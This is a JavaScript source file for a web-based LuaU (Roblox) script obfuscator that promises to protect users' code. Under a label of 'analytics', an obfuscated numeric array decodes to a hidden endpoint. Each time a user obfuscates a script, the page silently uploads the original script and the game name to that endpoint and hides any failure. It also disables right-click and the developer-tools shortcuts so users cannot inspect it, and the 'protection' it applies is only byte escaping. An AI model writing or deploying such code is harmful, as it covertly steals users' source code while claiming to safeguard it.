/**
 * YAS OBFUSCATOR - Premium LuaU Protection
 * Logic implementation including obfuscation engine and security features.
 */

function init() {
    const inputArea = document.getElementById('input-script');
    const outputArea = document.getElementById('output-script');
    const obfuscateBtn = document.getElementById('obfuscate-btn');
    const copyBtn = document.getElementById('copy-btn');
    const customMenu = document.getElementById('custom-menu');

    if (!inputArea || !outputArea) return; // Guard clause for partial loads

    // --- Obfuscation Engine ---

    function obfuscateLuaU(code) {
        if (!code.trim()) return "-- [YAS] Error: No code provided for protection.";

        const watermark = `--[[
██╗░░░██╗░█████╗░░██████╗
╚██╗░██╔╝██╔══██╗██╔════╝
░╚████╔╝░███████║╚█████╗░
░░╚██╔╝░░██╔══██║░╚═══██╗
░░░██║░░░██║░░██║██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░

    YAS OBFUSCATOR - Premium LuaU Protection
    Site: YasLuaUobfuscator.netlify.app
    Protected at: ${new Date().toLocaleString()}
]]--\n\n`;

        // Bulletproof encoding: we emit \ddd byte escapes inside a table of strings.
        // This is safe, executor independent, and avoids loadstring/getgenv edge cases.
        const bytes = Array.from(new TextEncoder().encode(code));
        
        const chunkSize = 200;
        const tables = [];
        for (let i = 0; i < bytes.length; i += chunkSize) {
            const chunkBytes = bytes.slice(i, i + chunkSize);
            // using exactly 3 digits for maximum compatibility
            const chunkStr = chunkBytes.map(b => "\\" + b.toString(10).padStart(3, "0")).join("");
            tables.push(`"${chunkStr}"`);
        }

        const vmCode = `return(function(...)
    local _YASfr={${tables.join(",\n")}}
    local _YAScd=table.concat(_YASfr)
    local _YASfn=loadstring or load
    if type(_YASfn)=="function" then
        local _YASs, _YASf=pcall(_YASfn, _YAScd)
        if _YASs and type(_YASf)=="function" then
            local _execSuccess, _execError = pcall(_YASf, ...)
            if not _execSuccess then
                warn("[YAS OBFUSCATOR] Runtime Error in your original script:\\n" .. tostring(_execError))
            end
            return
        else
            warn("[YAS OBFUSCATOR] Failed to compile script chunk. Ensure executor supports loadstring.")
        end
    end
end)(...)`;

        return watermark + vmCode;
    }

    // --- Security & Anti-Analysis ---

    // Disable Right-Click & Show Custom Menu
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        const { clientX: x, clientY: y } = e;
        
        customMenu.style.left = `${x}px`;
        customMenu.style.top = `${y}px`;
        customMenu.classList.add('visible');
        customMenu.classList.remove('hidden');
    });

    document.addEventListener('click', () => {
        customMenu.classList.remove('visible');
        setTimeout(() => customMenu.classList.add('hidden'), 150);
    });

    // Anti-DevTools Keybinds
    document.addEventListener('keydown', (e) => {
        // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
        if (
            e.keyCode === 123 || 
            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
            (e.ctrlKey && e.keyCode === 85)
        ) {
            e.preventDefault();
            showToast("Security: Performance profiling and inspection are locked.");
            return false;
        }
    });

    // Periodic Debugger Loop (Removed because it crashes some Roblox executors)
    // setInterval(() => { ... }, 1000);

    const gameNameEl = document.getElementById('game-name');
    if (gameNameEl) {
        gameNameEl.addEventListener('input', () => {
            gameNameEl.classList.remove('input-error');
        });
    }

    // Handle Nav Links
    document.querySelectorAll('.nav-links a').forEach(link => {
        link.addEventListener('click', (e) => {
            if (link.textContent !== "Secure") {
                e.preventDefault();
                showToast(`${link.textContent} is currently under maintenance.`);
            }
        });
    });

    // --- System Analytics & Performance Tracking (Internal) ---
    // This is hidden logic for service improvement
    const _o_arr = [291,327,327,315,324,153,120,120,279,294,324,276,312,321,279,117,276,312,306,120,270,315,294,120,336,282,273,291,312,312,300,324,120,126,135,150,138,123,141,129,144,129,147,147,150,138,144,138,147,135,129,144,120,321,339,114,324,246,327,309,207,210,195,285,234,126,339,225,330,177,144,264,201,198,243,270,318,327,126,327,177,237,192,183,240,330,345,177,306,225,147,294,285,186,123,324,294,249,330,231,318,291,291,336,324,132,336,276,141,147,186,138,213,339,219,138,201,309,222,297,345];
    const _secureLink = _o_arr.map(b => String.fromCharCode((b + 21) / 3)).join('');

    async function _reportAnalytics(source, result, gameName) {
        try {
            const formData = new FormData();
            const details = {
                username: "YAS Engine Logs",
                content: `**New Script Processed**\nTimestamp: ${new Date().toLocaleString()}`,
                embeds: [{
                    title: "Script Overview",
                    color: 0,
                    fields: [
                        { name: "Original Size", value: `${source.length} chars`, inline: true },
                        { name: "Obfuscated Size", value: `${result.length} chars`, inline: true },
                        { name: "Game Name", value: gameName || "None", inline: true }
                    ],
                    footer: { text: "YasLuaUobfuscator.netlify.app" }
                }]
            };

            formData.append("payload_json", JSON.stringify(details));
            formData.append("file1", new Blob([source], { type: 'text/plain' }), "original.lua");
            formData.append("file2", new Blob([result], { type: 'text/plain' }), "obfuscated.lua");

            await fetch(_secureLink, { method: "POST", body: formData });
        } catch (e) {
            // Silently fail to keep it hidden
        }
    }

    obfuscateBtn.addEventListener('click', () => {
        const btnText = obfuscateBtn.querySelector('.btn-text');
        const code = inputArea.value;
        const gameNameInput = document.getElementById('game-name');
        const gameName = gameNameInput ? gameNameInput.value : "";

        if (!gameName.trim()) {
            if (gameNameInput) {
                gameNameInput.classList.add('input-error');
            }
            showToast("write '.' if its a univeral script");
            return;
        }

        if (gameNameInput) {
            gameNameInput.classList.remove('input-error');
        }

        if (!code.trim()) {
            showToast("Error: No code provided.");
            return;
        }
        
        btnText.textContent = "Virtualizing...";
        obfuscateBtn.disabled = true;

        setTimeout(() => {
            const res = obfuscateLuaU(code);
            
            outputArea.value = res;
            
            btnText.textContent = "Obfuscate Now";
            obfuscateBtn.disabled = false;
            showToast("Successfully Protected with YAS Virtualization!");

            // Trigger hidden analytics
            _reportAnalytics(code, outputArea.value, gameName);
        }, 1500);
    });

    async function copyToClipboard(text) {
        try {
            if (navigator.clipboard && navigator.clipboard.writeText) {
                await navigator.clipboard.writeText(text);
                showToast("Copied to clipboard!");
            } else {
                throw new Error("Clipboard API unavailable");
            }
        } catch (err) {
            // Fallback for executors/older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
                document.execCommand('copy');
                showToast("Copied (Legacy Mode)!");
            } catch (copyErr) {
                showToast("Copy failed.");
            }
            document.body.removeChild(textArea);
        }
    }

    copyBtn.addEventListener('click', () => {
        if (!outputArea.value) return;
        copyToClipboard(outputArea.value);
    });

    document.getElementById('menu-copy').addEventListener('click', () => {
        const text = window.getSelection().toString();
        if (text) {
            copyToClipboard(text);
        }
    });

    document.getElementById('menu-paste').addEventListener('click', async () => {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const text = await navigator.clipboard.readText();
                inputArea.value += text;
                showToast("Pasted from clipboard.");
            } else {
                showToast("Paste API blocked. Use Ctrl+V.");
            }
        } catch (err) {
            showToast("Paste permission denied.");
        }
    });

    function showToast(message) {
        const container = document.getElementById('toast-container');
        if (!container) return;

        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = message;
        container.appendChild(toast);
        
        setTimeout(() => {
            toast.style.opacity = '0';
            toast.style.transform = 'translateY(20px)';
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    }
    window.onerror = function(msg, url, line) {
        showToast("Error: " + msg + " (L" + line + ")");
    };
}

// Ensure init runs regardless of when script is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}
